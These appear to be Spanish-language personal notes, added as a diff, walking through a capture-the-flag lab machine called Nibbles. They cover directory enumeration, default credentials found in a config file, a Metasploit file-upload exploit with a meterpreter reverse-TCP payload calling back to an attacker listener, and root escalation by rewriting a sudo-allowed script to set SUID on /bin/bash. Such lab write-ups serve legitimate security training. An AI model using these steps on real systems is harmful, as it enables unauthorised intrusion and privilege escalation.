@@ -1,0 +1,132 @@
+Nibbles
+
+	10.129.96.84
+	
+	Nmap
+	
+		22
+		80
+		
+	Gobuster
+	
+		gobuster dir -u http://10.129.96.84/nibbleblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,js -t 50
+		
+			index.php            (Status: 200) [Size: 2987]
+			sitemap.php          (Status: 200) [Size: 402]
+			content              (Status: 301) [Size: 325] [--> http://10.129.96.84/nibbleblog/content/]
+			themes               (Status: 301) [Size: 324] [--> http://10.129.96.84/nibbleblog/themes/]
+			feed.php             (Status: 200) [Size: 302]
+			admin                (Status: 301) [Size: 323] [--> http://10.129.96.84/nibbleblog/admin/]
+			admin.php            (Status: 200) [Size: 1401]
+			plugins              (Status: 301) [Size: 325] [--> http://10.129.96.84/nibbleblog/plugins/]
+			install.php          (Status: 200) [Size: 78]
+			update.php           (Status: 200) [Size: 1622]
+			README               (Status: 200) [Size: 4628]
+			languages            (Status: 301) [Size: 327] [--> http://10.129.96.84/nibbleblog/languages/]
+			LICENSE.txt          (Status: 200) [Size: 35148]
+			COPYRIGHT.txt        (Status: 200) [Size: 1272]
+
+	http://10.129.96.84/nibbleblog/content     /user.xml       /config.xml
+	
+		mail > admin@nibbles.com
+		user > admin
+		pass > nibbles
+
+		| Archivo | ¿Por qué es interesante? |
+		|---|---|
+		| `config.xml` | Configuración de Nibbleblog |
+		| `users.xml` | Información de usuarios |
+		| `keys.php` | Archivo PHP relacionado con claves |
+		| `plugins/` | Configuración de complementos |
+		| `notifications.xml` | Notificaciones del sistema |
+
+		Ir probando posibles contraseñas
+
+	msfconsole -q
+	
+		exploit/multi/http/nibbleblog_file_upload
+		
+		Name       Current Setting  Required  Description
+	   ----       ---------------  --------  -----------
+	   PASSWORD   nibbles          yes       The password to authenticate with
+	   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][..
+											 .]. Supported proxies: sapni, socks4, socks5, http, socks5
+											 h
+	   RHOSTS     10.129.96.84     yes       The target host(s), see https://docs.metasploit.com/docs/u
+											 sing-metasploit/basics/using-metasploit.html
+	   RPORT      80               yes       The target port (TCP)
+	   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+	   TARGETURI  /nibbleblog/     yes       The base path to the web application
+	   USERNAME   admin            yes       The username to authenticate with
+	   VHOST                       no        HTTP server virtual host
+
+
+		Payload options (php/meterpreter/reverse_tcp):
+
+		   Name   Current Setting  Required  Description
+		   ----   ---------------  --------  -----------
+		   LHOST  10.10.14.79      yes       The listen address (an interface may be specified)
+		   LPORT  4444             yes       The listen port
+
+
+		Exploit target:
+
+		   Id  Name
+		   --  ----
+		   0   Nibbleblog 4.0.3
+
+	shell
+	
+		/home/nibbler/user.txt
+
+	permisos admin
+	
+		Ver la manera de explotarlo 
+		
+			sudo -l
+			
+				Matching Defaults entries for nibbler on Nibbles:
+				env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+				User nibbler may run the following commands on Nibbles:
+				(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+
+		Ir a la ubicacion del fichero 
+
+			cd /home/nibbler
+			
+		Descomprimirlo 
+			
+			unzip personal.zip
+			
+		Sobreescribir el fichero monitor.sh 
+		
+			echo '#!/bin/bash' > monitor.sh
+			echo 'chmod +s /bin/bash' >> monitor.sh
+			
+		Comprbarlo
+			
+			cat monitor.sh
+			
+				#!/bin/bash
+				chmod +s /bin/bash
+
+		Comprobar que sigue siendo ejecutable
+		
+			ls -la monitor.sh
+			
+		Ejecutarlo con sudo 
+
+			sudo /home/nibbler/personal/stuff/monitor.sh
+			
+		Comprobar el SSUID en bash
+		
+			ls -la /bin/bash
+		
+		Lanzar bash preservando privilegios
+
+			bash -p
+			
+		Comprobar ahora el usuario 
+		
+			id
